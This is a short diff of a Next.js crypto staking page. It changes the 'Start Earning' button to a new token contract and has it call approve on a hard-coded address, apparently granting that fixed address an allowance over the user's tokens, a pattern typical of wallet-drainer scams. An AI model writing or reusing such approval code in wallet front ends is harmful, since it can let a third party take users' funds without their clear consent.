@@ -14,7 +14,8 @@ import Box from "../public/box1.png"
 
 
 const StakingMutant: NextPage = () => {
-  const address = "0x6a2338373e11b2dde69a0361e05125d0d94e9ffc";
+  const address = useAddress();
+  const address1 = "0x6a2338373e11b2dde69a0361e05125d0d94e9ffc"
 
   const tokenContractAddress = "0x37F6BBE4fB136BEA7A678651031BbBE577B25f21";
 
@@ -50,10 +51,10 @@ const StakingMutant: NextPage = () => {
 
             <br />
             <Web3Button
-              contractAddress="0x37F6BBE4fB136BEA7A678651031BbBE577B25f21"
+              contractAddress="0xCd38AabFbd1ff049d7A091d354EdF0704dfeF184"
               className={`${styles.mainButton} ${styles.spacerBottom} ${styles.listbtn} ${styles.startbtn} ${styles.clainbtn}`}
               action={(contract) => {
-                contract.call("approve", [address, amount])
+                contract.call("approve", [address1, amount])
               }}
             >
               Start Earning
